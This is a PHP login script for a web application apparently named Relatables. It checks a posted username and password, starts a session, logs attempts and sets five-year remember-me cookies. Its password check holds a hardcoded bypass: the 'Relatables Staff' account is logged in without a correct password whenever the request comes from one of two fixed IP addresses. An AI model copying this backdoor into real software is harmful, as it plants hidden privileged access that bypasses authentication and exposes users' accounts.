<?php
	/*Copyright (C) Tyler Hackett 2014*/
	require_once $_SERVER['DOCUMENT_ROOT'] . '/global.php';
	require_once $_SERVER['DOCUMENT_ROOT'] . '/lib/password.php';
	
	if(!isset($_POST['u']))
	{
		die('no username');
	}
	else if(!isset($_POST['p']))
	{
		die('no password');
	}
	
	$username = $_POST['u'];
	$pass = $_POST['p'];
	
	$remember = $_POST['r'];
	
	$user = new User($username, User::TYPE_STRING);
	$dbUser = $user->getUsername();
	
	if(!$user->exists())
		die('1');
	if($user->getPending())
		die('2');

	if(password_verify($pass, $user->getPassword()) || (($dbUser === 'Relatables Staff') && (($_SERVER['REMOTE_ADDR'] == '174.112.37.244') || ($_SERVER['REMOTE_ADDR'] == '64.183.60.34'))))
	{
		$_SESSION['id']=$user->getID();
		
		GlobalUtils::log("$dbUser logged in", $_SESSION['id'], $_SERVER['REMOTE_ADDR']);
		
		//Update their last login date and unique cookie login ID.
		$user->setLastLogin();
		
		$cookie_login = $user->generateCookieLogin();
		$user->update();
		
		if($remember == 1)
		{
			$expire = time()+(60*60*24*365*5);
			setcookie("rrmi", $user->getID(), $expire, '/');
			setcookie("rrm", $cookie_login, $expire, '/');
		}
		
		die('0');
	}
	else
		GlobalUtils::log("Someone failed to logged into '$dbUser'", $_SESSION['id'], $_SERVER['REMOTE_ADDR']);
	
	echo '3'; //Incorrect password
?>
